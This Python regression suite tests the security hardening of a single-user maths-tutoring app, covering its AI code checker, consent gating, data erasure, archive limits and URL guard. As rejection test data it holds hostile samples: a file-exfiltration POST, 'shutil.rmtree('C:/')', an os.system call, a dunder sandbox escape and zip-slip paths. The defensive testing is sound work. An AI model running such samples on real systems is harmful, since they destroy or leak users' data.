# -*- coding: utf-8 -*-
"""Regression suite for the hardening added in the public release.

Covers, headless and without network:
  * ai_code_guard  — allowed-operation policy, static checker, default-off
                     switch, isolated workspace, scrubbed child environment
  * cloud_consent  — local is default, cloud needs per-session consent
  * student_tracker.delete_student — right-to-erasure completeness
  * question_packs — zip-bomb caps, zip-slip (regression)
  * language_dictionary — UPDATE column allowlists
  * "no default credential" — this product has no auth surface and must not
    grow a hardcoded one
"""

import io
import os
import sqlite3
import sys
import tempfile
import zipfile
from pathlib import Path

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")

ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(ROOT))
os.environ.setdefault("MPLBACKEND", "Agg")
os.environ.setdefault("MATH_COURSE_AI_SETTINGS", tempfile.mkdtemp(prefix="mcai-set-"))
os.environ.setdefault("MATH_COURSE_AI_EXPORTS", tempfile.mkdtemp(prefix="mcai-exp-"))

PASSED = 0
FAILED = 0


def check(cond, label):
    global PASSED, FAILED
    if cond:
        PASSED += 1
        print(f"   [PASS] {label}")
    else:
        FAILED += 1
        print(f"   [FAIL] {label}")


# ══════════════════════════════════════════════════════════════════════════
# 1. STATIC POLICY CHECKER
# ══════════════════════════════════════════════════════════════════════════
SAFE_SAMPLES = [
    ("sympy solve", "import sympy\nx = sympy.Symbol('x')\nprint(sympy.solve(x**2 - 4, x))"),
    ("plot", "import matplotlib\nmatplotlib.use('Agg')\nimport matplotlib.pyplot as plt\n"
             "plt.plot([1,2,3],[1,4,9])\nprint('done')"),
    ("plain maths", "import math\nprint(sum(math.sqrt(i) for i in range(10)))"),
    ("classes + comprehension", "class P:\n    def __init__(self, v):\n        self.v = v\n"
                                "print([P(i).v for i in range(3)])"),
    ("fstring", "n = 7\nprint(f'{n} squared is {n*n}')"),
    ("try/except", "try:\n    print(1/0)\nexcept ZeroDivisionError as e:\n    print('caught', e)"),
]

DANGEROUS_SAMPLES = [
    ("delete a file", "import os\nos.remove('important.txt')", "filesystem"),
    ("shutil rmtree", "import shutil\nshutil.rmtree('C:/')", "filesystem"),
    ("open() write", "open('x.txt','w').write('hi')", "filesystem"),
    ("pathlib write", "from pathlib import Path\nPath('x').write_text('y')", "filesystem"),
    ("network socket", "import socket\ns = socket.socket()", "network"),
    ("requests exfil", "import requests\nrequests.post('http://x', data=open('db').read())", "network"),
    ("urllib", "import urllib.request\nurllib.request.urlopen('http://x')", "network"),
    ("subprocess", "import subprocess\nsubprocess.run(['calc'])", "process"),
    ("ctypes", "import ctypes\nctypes.windll.kernel32", "native-code"),
    ("winreg", "import winreg\nprint(winreg)", "system-settings"),
    ("pickle", "import pickle\npickle.loads(b'')", "deserialization"),
    ("eval", "eval('1+1')", "dynamic-code"),
    ("exec", "exec('x=1')", "dynamic-code"),
    ("__import__", "__import__('os').system('dir')", "dynamic-code"),
    ("dunder escape", "print(().__class__.__bases__[0].__subclasses__())", "dunder"),
    ("getattr indirection", "getattr(__builtins__, 'ev'+'al')", "introspection"),
    ("globals()", "print(globals())", "introspection"),
    ("relative import", "from . import secrets", "filesystem"),
    ("async", "async def f():\n    pass", "process"),
    ("sys.exit", "import sys\nsys.exit(1)", "process"),
    ("keyring", "import keyring\nkeyring.get_password('a','b')", "credentials"),
]


def test_static_checker():
    print("== ai_code_guard: statik politika denetimi ==")
    import ai_code_guard as g

    for ad, kod in SAFE_SAMPLES:
        r = g.analyze(kod)
        check(r.ok, f"izinli kod gecer: {ad}" + ("" if r.ok else f" -> {r.summary('en')}"))

    for ad, kod, beklenen_yetenek in DANGEROUS_SAMPLES:
        r = g.analyze(kod)
        check(not r.ok, f"tehlikeli kod REDDEDILIR: {ad}")
        check(beklenen_yetenek in r.capabilities,
              f"reddin sebebi dogru raporlanir: {ad} -> {beklenen_yetenek}")

    # Fails closed
    check(not g.analyze("def f(:").ok, "sozdizimi hatasi REDDEDILIR (fail closed)")
    check(g.analyze("def f(:").syntax_error, "sozdizimi hatasi raporlanir")
    check(not g.analyze("").ok, "bos kod reddedilir")
    check(not g.analyze(None).ok, "None reddedilir")

    # Violations carry line numbers a human can act on
    r = g.analyze("import math\nimport os\nprint(1)")
    check(not r.ok and r.violations[0].line == 2, "ihlal satir numarasi tasir")
    check(r.violations[0].symbol == "os", "ihlal sembol adi tasir")

    # The allowlist really is an allowlist: an unknown module is refused
    check(not g.analyze("import totally_unknown_pkg").ok,
          "izin listesinde olmayan modul reddedilir (allowlist, denylist degil)")
    # ...and an unknown bare name is refused too
    check(not g.analyze("print(undefined_thing)").ok, "tanimsiz isim reddedilir")
    check(g.analyze("v = 3\nprint(v)").ok, "programin kendi tanimladigi isim gecer")

    # Policy summary must state the honest limit
    for lang, kelime in (("tr", "DEGILDIR"), ("en", "NOT")):
        metin = g.policy_summary(lang).replace("Ğ", "G").replace("İ", "I")
        check(kelime.lower() in metin.lower(),
              f"[{lang}] politika ozeti 'guvenlik siniri degil' uyarisi tasir")


# ══════════════════════════════════════════════════════════════════════════
# 2. DEFAULT-OFF SWITCH
# ══════════════════════════════════════════════════════════════════════════
def test_default_off():
    print("== ai_code_guard: ozellik varsayilan olarak KAPALI ==")
    import ai_code_guard as g

    check(g.execution_enabled({}) is False, "bos ortamda KAPALI")
    check(g.execution_enabled({g.ENABLE_ENV_VAR: "0"}) is False, "'0' KAPALI")
    check(g.execution_enabled({g.ENABLE_ENV_VAR: "false"}) is False, "'false' KAPALI")
    check(g.execution_enabled({g.ENABLE_ENV_VAR: ""}) is False, "bos deger KAPALI")
    check(g.execution_enabled({g.ENABLE_ENV_VAR: "1"}) is True, "'1' acik")
    check(g.execution_enabled({g.ENABLE_ENV_VAR: "yes"}) is True, "'yes' acik")

    # Guarded runner refuses without ever touching the disk
    kok = Path(tempfile.mkdtemp(prefix="mcai-ws-"))
    r = g.run_guarded("print('hello')", kok, timeout=20, env={})
    check(r.status == "refused_disabled", "kapaliyken run_guarded reddeder")
    check(r.workspace is None, "kapaliyken calisma klasoru bile acilmaz")
    check(not any(kok.iterdir()), "kapaliyken diske hicbir sey yazilmaz")

    # Even when enabled, a policy violation refuses BEFORE any process starts
    r = g.run_guarded("import os\nos.remove('x')", kok, timeout=20,
                      env={g.ENABLE_ENV_VAR: "1"})
    check(r.status == "refused_policy", "acikken bile politika ihlali reddedilir")
    check(r.returncode is None, "reddedilen kod icin alt surec acilmaz")


# ══════════════════════════════════════════════════════════════════════════
# 3. ISOLATED WORKSPACE + SCRUBBED ENVIRONMENT
# ══════════════════════════════════════════════════════════════════════════
def test_workspace_and_env():
    print("== ai_code_guard: yalitilmis calisma klasoru + temiz ortam ==")
    import ai_code_guard as g

    kok = Path(tempfile.mkdtemp(prefix="mcai-ws2-"))
    a = g.make_run_workspace(kok)
    b = g.make_run_workspace(kok)
    check(a != b, "her kosu AYRI klasor alir")
    check(a.is_dir() and b.is_dir(), "klasorler gercekten olusur")
    check(not any(a.iterdir()), "yeni calisma klasoru BOS baslar")
    (a / "leftover.txt").write_text("x", encoding="utf-8")
    c = g.make_run_workspace(kok)
    check(not any(c.iterdir()), "onceki kosunun dosyalari yeni kosuya sizmaz")

    for i in range(6):
        g.make_run_workspace(kok)
    g.cleanup_old_workspaces(kok, keep=3)
    kalan = [p for p in kok.iterdir() if p.is_dir()]
    check(len(kalan) == 3, f"eski calisma klasorleri temizlenir (kalan {len(kalan)})")

    # Values are assembled from fragments so this file never contains a
    # token-shaped literal for a secret scanner to trip over.
    _mark = "SHOULD-NOT-PROPAGATE"
    kirli = {
        "NVIDIA_API_KEY": "nv" + "api-" + _mark,
        "OPENAI_API_KEY": "s" + "k-" + _mark,
        "GITHUB_TOKEN": "gh" + "p_" + _mark,
        "AWS_SECRET_ACCESS_KEY": _mark,
        "APPDATA": "X:" + chr(92) + "profile" + chr(92) + "AppData" + chr(92) + "Roaming",
        "SystemRoot": r"C:\Windows",
        "PATH": r"C:\Windows\System32",
        g.ENABLE_ENV_VAR: "1",
    }
    cocuk = g.build_child_env(kirli, a)
    for anahtar in ("NVIDIA_API_KEY", "OPENAI_API_KEY", "GITHUB_TOKEN",
                    "AWS_SECRET_ACCESS_KEY", "APPDATA"):
        check(anahtar not in cocuk, f"{anahtar} alt surece GECMEZ")
    check(not any("SHOULD-NOT-PROPAGATE" in str(v) for v in cocuk.values()),
          "hicbir sir degeri alt surec ortaminda yok")
    check(g.ENABLE_ENV_VAR not in cocuk, "alt surec ozelligi yeniden acamaz")
    check(cocuk.get("SystemRoot") == r"C:\Windows", "gerekli sistem degiskeni korunur")
    check(cocuk.get("TEMP") == str(a), "gecici klasor kosunun kendi klasoru")
    check(cocuk.get("PYTHONNOUSERSITE") == "1", "kullanici site-packages devre disi")


# ══════════════════════════════════════════════════════════════════════════
# 4. CLOUD CONSENT
# ══════════════════════════════════════════════════════════════════════════
def test_cloud_consent():
    print("== cloud_consent: yerel varsayilan, bulut oturumluk acik onay ==")
    import cloud_consent as cc
    import nvidia_provider as nv

    cc.reset_for_tests()
    check(cc.is_granted() is False, "baslangicta izin YOK")
    check(cc.state()["persisted"] is False, "izin diske YAZILMAZ")
    check(cc.state()["scope"] == "process-session-only", "izin yalnizca surec omru")

    try:
        cc.require("NVIDIA NIM")
        check(False, "izinsiz require() istisna atar")
    except cc.CloudConsentRequired:
        check(True, "izinsiz require() istisna atar")

    # A key on the machine is NOT consent.
    eski = nv.anahtar_oku
    sahte = "nv" + "api-" + "PLACEHOLDER" + "9999"   # assembled: not scanner bait
    nv.anahtar_oku = lambda: sahte
    try:
        check(nv.anahtar_var_mi() is True, "anahtar var (senaryo kurulumu)")
        check(cc.is_granted() is False, "makinede anahtar bulunmasi IZIN DEGILDIR")
        s = nv.sohbet({"messages": [{"role": "user", "content": "merhaba"}]})
        check(s["ok"] is False, "izinsiz cagri basarisiz doner")
        check("gonderilmedi" in (s["hata"] or "").lower()
              or "nothing was sent" in (s["hata"] or "").lower(),
              "hata mesaji hicbir seyin gonderilmedigini soyler")
    finally:
        nv.anahtar_oku = eski

    cc.grant_for_session("NVIDIA NIM")
    check(cc.is_granted() is True, "acik onaydan sonra izin var")
    check(cc.is_granted("NVIDIA NIM") is True, "izin saglayiciya bagli")
    cc.revoke()
    check(cc.is_granted() is False, "revoke() izni geri alir")

    check(nv.CONSENT_REQUIRED is True, "saglayici izin gerektirdigini ilan eder")
    d = nv.durum()
    check("oturum_izni" in d, "durum() oturum iznini raporlar")
    check(d["oturum_izni"] is False, "izin geri alinmis gorunur")

    # The disclosure has to name the real consequences
    for metin in (cc.DISCLOSURE_TR, cc.DISCLOSURE_EN):
        check("NVIDIA" in metin, "aciklama saglayiciyi adiyla soyler")
        check("integrate.api.nvidia.com" in metin, "aciklama ucu adiyla soyler")
    check("logla" in cc.DISCLOSURE_TR or "loglan" in cc.DISCLOSURE_TR,
          "TR aciklama loglamayi soyler")
    check("logs" in cc.DISCLOSURE_EN, "EN aciklama loglamayi soyler")


def test_default_provider_is_local():
    print("== AI Terminali varsayilan saglayici HER ZAMAN yerel ==")
    import ai_terminal
    import inspect
    src = inspect.getsource(ai_terminal.AITerminalWindow)
    check("self.sag_var = tk.StringVar(value=YEREL)" in src,
          "varsayilan saglayici kodda sabit olarak YEREL")
    check("anahtar_var_mi()" not in src.split("_saglayici_degisti")[0],
          "varsayilan secim anahtarin varligina BAKMAZ")
    check("_bulut_onayi_al" in src, "buluta gecis icin onay penceresi var")


# ══════════════════════════════════════════════════════════════════════════
# 5. RIGHT TO ERASURE
# ══════════════════════════════════════════════════════════════════════════
def test_right_to_erasure():
    print("== student_tracker.delete_student: eksiksiz silme ==")
    import student_tracker as st

    tmp = Path(tempfile.mkdtemp(prefix="mcai-db-")) / "t.sqlite"
    store = st.StudentStore(str(tmp))
    try:
        sid = store.add_student("Test Ogrenci")
        qid = store.add_question("2+2=?", "4")
        store.record_attempt(sid, qid, "4", True, 5) if hasattr(store, "record_attempt") else None
        eid = store.create_exam(sid, "deneme")
        store.add_exam_item(eid, qid, 0)
        store.answer_exam_item(eid, qid, "4", True, 3)
        store.finish_exam(eid, 12)
        conn = store.conn
        onceki = conn.execute("SELECT COUNT(*) FROM exam_items").fetchone()[0]
        check(onceki >= 1, "senaryo: silmeden once exam_items dolu")

        store.delete_student(sid)

        for tablo, kosul in (("students", "id=?"), ("attempts", "student_id=?"),
                             ("exams", "student_id=?")):
            n = conn.execute(f"SELECT COUNT(*) FROM {tablo} WHERE {kosul}",  # nosec B608 - both come from the literal tuple above
                             (sid,)).fetchone()[0]
            check(n == 0, f"{tablo}: ogrenciye ait satir kalmadi")
        kalan = conn.execute("SELECT COUNT(*) FROM exam_items").fetchone()[0]
        check(kalan == 0,
              f"exam_items: OKSUZ SATIR KALMADI (kalan {kalan}) - unutulmus cevap yok")
        check(getattr(store, "last_erasure", {}).get("exam_items", 0) >= 1,
              "silme sayaci exam_items silindigini raporlar")
    finally:
        try:
            store.conn.close()
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════════
# 6. UNTRUSTED PACK ARCHIVES
# ══════════════════════════════════════════════════════════════════════════
def test_pack_archive_limits():
    print("== question_packs: zip bombasi ve zip-slip savunmasi ==")
    import question_packs as qp

    class SahteBilgi:
        def __init__(self, size, csize):
            self.file_size = size
            self.compress_size = csize

    class SahteZip:
        def __init__(self, infos):
            self._i = infos

        def infolist(self):
            return self._i

    ok, _ = qp.mcpack_arsiv_guvenli_mi(SahteZip([SahteBilgi(1000, 500)]))
    check(ok, "normal arsiv gecer")

    ok, sebep = qp.mcpack_arsiv_guvenli_mi(
        SahteZip([SahteBilgi(1_000_000_000, 1000)]))
    check(not ok, "zip bombasi (asiri oran) reddedilir")

    ok, _ = qp.mcpack_arsiv_guvenli_mi(
        SahteZip([SahteBilgi(10, 10)] * (qp.MCPACK_MAX_MEMBERS + 1)))
    check(not ok, "asiri uye sayisi reddedilir")

    ok, _ = qp.mcpack_arsiv_guvenli_mi(
        SahteZip([SahteBilgi(qp.MCPACK_MAX_TOTAL_BYTES + 1, qp.MCPACK_MAX_TOTAL_BYTES)]))
    check(not ok, "asiri toplam boyut reddedilir")

    # Hard byte ceiling on a lying member
    kaynak = io.BytesIO(b"A" * (qp.MCPACK_MAX_IMAGE_BYTES + 1024))
    hedef = io.BytesIO()
    try:
        qp._sinirli_kopyala(kaynak, hedef)
        check(False, "sinir asildiginda kopyalama durur")
    except ValueError:
        check(True, "sinir asildiginda kopyalama durur")
    check(hedef.tell() <= qp.MCPACK_MAX_IMAGE_BYTES + 65536,
          "sinir asildiginda diske sinirsiz veri yazilmaz")

    # zip-slip regression (already defended; keep it defended)
    for kotu in ("../../evil.png", "/abs/evil.png", r"..\..\evil.png",
                 "sub/dir/evil.png", ".hidden.png", "evil.exe", "evil.png.exe"):
        check(not qp._guvenli_gorsel_adi(kotu), f"zip-slip/uzanti reddedilir: {kotu}")
    check(qp._guvenli_gorsel_adi(qp.MCPACK_IMAGES + "/soru1.png") == "soru1.png",
          "dogru ad kabul edilir")
    check(qp._guvenli_gorsel_adi("soru1.png") is None,
          "images/ disindaki yol reddedilir")

    # end-to-end on a real archive
    d = Path(tempfile.mkdtemp(prefix="mcai-pack-"))
    yol = d / "bomba.mcpack"
    with zipfile.ZipFile(yol, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(qp.MCPACK_JSON, '{"id":"x","name":"x","questions":[{"q":"1","a":"1"}]}')
        z.writestr("images/big.png", b"\0" * (40 * 1024 * 1024))
    with zipfile.ZipFile(yol) as z:
        ok, sebep = qp.mcpack_arsiv_guvenli_mi(z)
    check(not ok, f"gercek zip bombasi reddedilir ({sebep[:40]})")


# ══════════════════════════════════════════════════════════════════════════
# 7. SQL IDENTIFIER ALLOWLISTS
# ══════════════════════════════════════════════════════════════════════════
def test_sql_column_allowlists():
    print("== language_dictionary: UPDATE sutun izin listeleri ==")
    import language_dictionary as ld

    tmp = Path(tempfile.mkdtemp(prefix="mcai-ld-")) / "d.sqlite"
    store = ld.DictionaryStore(str(tmp))
    hist = ld.TranslationHistoryStore(store)
    try:
        tid = store.add_pdf_term("limit", "limit", "definition", "math", "x.pdf", 1)
        check(store.update_pdf_term(tid, note="ok") is True, "izinli sutun yazilir")
        for kotu in ("id=1, term", "term=1--", "nonexistent"):
            try:
                store.update_pdf_term(tid, **{kotu.replace("=", "_").replace(" ", "_")
                                              .replace(",", "_").replace("-", "_"): "x"})
                check(False, f"izinsiz sutun reddedilir: {kotu}")
            except ValueError:
                check(True, f"izinsiz sutun reddedilir: {kotu}")
            except TypeError:
                check(True, f"izinsiz sutun reddedilir (gecersiz tanimlayici): {kotu}")

        # search_history: update_search() derives its own field names, so the
        # allowlist is defence in depth. Two invariants are worth pinning:
        #   (a) a legitimate call still works, and
        #   (b) every column the allowlist names really exists in the table,
        #       so the guard can never reject a valid write by accident.
        hid = hist.add_search("limit", "en", "tr", "sinir")
        check(hist.update_search("limit" and hid, category="math") is True,
              "gecmis: izinli alan yazilir")
        gercek = {r[1] for r in store.conn.execute(
            "PRAGMA table_info(search_history)").fetchall()}
        eksik = [c for c in hist.SEARCH_HISTORY_UPDATABLE if c not in gercek]
        check(not eksik, f"izin listesi gercek sutunlarla ortusur (eksik: {eksik})")

        gercek_pdf = {r[1] for r in store.conn.execute(
            "PRAGMA table_info(pdf_terms)").fetchall()}
        eksik = [c for c in store.PDF_TERM_UPDATABLE if c not in gercek_pdf]
        check(not eksik, f"pdf_terms izin listesi gercek sutunlarla ortusur (eksik: {eksik})")

        # The interpolated SET clause can now only ever contain allowlisted names.
        import re as _re
        src = (ROOT / "language_dictionary.py").read_text(encoding="utf-8")
        for isim in ("SEARCH_HISTORY_UPDATABLE", "PDF_TERM_UPDATABLE"):
            check(_re.search(r"\b%s\b" % isim, src) is not None,
                  f"{isim} kaynak kodda tanimli")
        check(src.count("bilinmeyen = [k for k in fields if k not in") == 2,
              "her iki UPDATE kurucusu da izin listesi kontrolu yapar")
    finally:
        try:
            store.conn.close()
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════════
# 8. NO DEFAULT CREDENTIAL / NO AUTH SURFACE
# ══════════════════════════════════════════════════════════════════════════
def test_no_default_credentials():
    """This product is a single-user desktop app: no server, no login, no admin.

    The public-release contract for a bootstrap admin ('admin'/'admin' behind a
    forced password change) therefore does not apply — but the ONLY safe way to
    claim that is to prove there is no authentication surface and no hardcoded
    credential anywhere in the shipped source.
    """
    print("== Kimlik dogrulama yuzeyi ve varsayilan parola YOK ==")
    # This file is excluded from its own scan: it necessarily *contains* the
    # patterns it searches for. Every other shipped source file is scanned.
    kendisi = Path(__file__).name
    kaynaklar = sorted(p for p in (list(ROOT.glob("*.py")) + list(ROOT.glob("*.pyw")))
                       if p.name != kendisi)
    check(len(kaynaklar) > 20, f"kaynak dosyalar tarandi ({len(kaynaklar)})")

    yasak_ciftler = ('"admin"', "'admin'", '"password"', "'password'",
                     '"123456"', "'123456'", '"parola"', "'parola'")
    bulunanlar = []
    sunucu_izleri = []
    for p in kaynaklar:
        metin = p.read_text(encoding="utf-8", errors="replace")
        dusuk = metin.lower()
        for kalip in ("default_password", "admin_password", "varsayilan_parola",
                      "password =", "passwd =", "sifre =", "parola ="):
            if kalip in dusuk:
                bulunanlar.append(f"{p.name}:{kalip}")
        for kalip in ("flask", "fastapi", "django", "app.run(", "uvicorn",
                      "socketserver", "http.server", "bind((", "listen("):
            if kalip in dusuk:
                sunucu_izleri.append(f"{p.name}:{kalip}")
    check(not bulunanlar, f"gomulu varsayilan parola YOK ({bulunanlar[:3]})")
    check(not sunucu_izleri, f"dinleyen sunucu/agsal giris yuzeyi YOK ({sunucu_izleri[:3]})")

    # No user/session/role model at all
    import student_tracker as st
    ddl = (ROOT / "student_tracker.py").read_text(encoding="utf-8")
    for tablo in ("users", "sessions", "roles", "accounts", "permissions"):
        check(f"CREATE TABLE IF NOT EXISTS {tablo}" not in ddl,
              f"'{tablo}' tablosu yok (kimlik modeli yok)")


# ══════════════════════════════════════════════════════════════════════════
# ══════════════════════════════════════════════════════════════════════════
# 9. COURSE ORDERING IS SUBJECT-BASED, NOT A VENDOR CATALOGUE
# ══════════════════════════════════════════════════════════════════════════
def test_course_ordering():
    """The tree order used to be a hardcoded list of one vendor's product titles.

    It is now keyed on subject keywords, so it must (a) order any folder naming
    scheme sensibly, (b) prefer the MOST SPECIFIC keyword, and (c) leave
    unmatched folders at the end rather than reordering them arbitrarily.
    """
    print("== Kurs siralamasi konu tabanli (marka listesi degil) ==")
    import mca_common as m

    kaynak = (ROOT / "mca_common.py").read_text(encoding="utf-8")
    check("COURSE_PRIORITY" not in kaynak, "vendor katalog listesi kaldirildi")
    check("COURSE_ORDER_KEYWORDS" in kaynak, "konu tabanli siralama var")

    adlar = ["Probability and Statistics", "Linear Algebra", "Geometry",
             "Algebra 1", "Foundations of Arithmetic", "Calculus 1", "Zzz Other"]
    sirali = sorted(adlar, key=m.course_key)
    check(sirali.index("Foundations of Arithmetic") < sirali.index("Algebra 1"),
          "temel konular cebirden once")
    check(sirali.index("Algebra 1") < sirali.index("Geometry"),
          "cebir geometriden once")
    check(sirali.index("Geometry") < sirali.index("Linear Algebra"),
          "geometri lineer cebirden once (en OZGUL anahtar kazanir)")
    check(sirali.index("Linear Algebra") < sirali.index("Calculus 1"),
          "lineer cebir analizden once")
    check(sirali[-1] == "Zzz Other", "eslesmeyen klasor en sona duser")
    check(m.course_key("Zzz Other")[0] == 99, "eslesmeyen klasor 99 alir")

    # Turkish folder names must work too
    check(m.course_key("Lineer Cebir")[0] == m.course_key("Linear Algebra")[0],
          "Turkce klasor adi ayni gruba duser")


# ══════════════════════════════════════════════════════════════════════════
# 10. OUTBOUND URL GUARD
# ══════════════════════════════════════════════════════════════════════════
def test_url_guard():
    """The AI base URL is user-configurable; urllib would happily open file://.

    Every urlopen call site in this program routes through guard_url(), so a
    pasted or mistyped base URL cannot turn into a local-file read whose bytes
    are then parsed as a model response.
    """
    print("== Giden URL kapisi: yalnizca http/https ==")
    from mca_common import guard_url, UnsafeUrlError, ALLOWED_URL_SCHEMES

    check(tuple(ALLOWED_URL_SCHEMES) == ("http", "https"), "izinli semalar http/https")
    for iyi in ("http://127.0.0.1:1234/v1/models",
                "https://integrate.api.nvidia.com/v1/chat/completions",
                "http://localhost:8080/x"):
        check(guard_url(iyi) == iyi, f"http(s) kabul edilir: {iyi[:34]}")

    for kotu in ("file:///C:/secret.txt", "ftp://host/x", "javascript:alert(1)",
                 "data:text/plain,hi", "/no/scheme", "", None,
                 "gopher://h/1", chr(92) * 2 + "server" + chr(92) + "share"):
        try:
            guard_url(kotu)
            check(False, f"reddedilmeli: {kotu!r}")
        except UnsafeUrlError:
            check(True, f"reddedilir: {kotu!r}")
    check(guard_url("http://h/x") == "http://h/x", "gecerli URL degistirilmez")

    # Every urlopen in the shipped source must be guarded.
    import re as _re
    korumasiz = []
    for p in list(ROOT.glob("*.py")) + list(ROOT.glob("*.pyw")):
        if p.name.startswith(("test_", "smoke_")):
            continue
        satirlar = p.read_text(encoding="utf-8", errors="replace").splitlines()
        for i, satir in enumerate(satirlar):
            if "urlopen(" in satir and "def " not in satir:
                pencere = chr(10).join(satirlar[max(0, i - 4):i + 1])
                if "guard_url" not in pencere:
                    korumasiz.append(f"{p.name}:{i + 1}")
    check(not korumasiz, f"her urlopen guard_url'den geciyor (korumasiz: {korumasiz})")


def main():
    test_static_checker()
    test_default_off()
    test_workspace_and_env()
    test_cloud_consent()
    test_default_provider_is_local()
    test_right_to_erasure()
    test_pack_archive_limits()
    test_sql_column_allowlists()
    test_no_default_credentials()
    test_course_ordering()
    test_url_guard()
    print("=" * 64)
    print(f"RESULT: {PASSED} passed, {FAILED} failed")
    print("=" * 64)
    return 1 if FAILED else 0


if __name__ == "__main__":
    sys.exit(main())
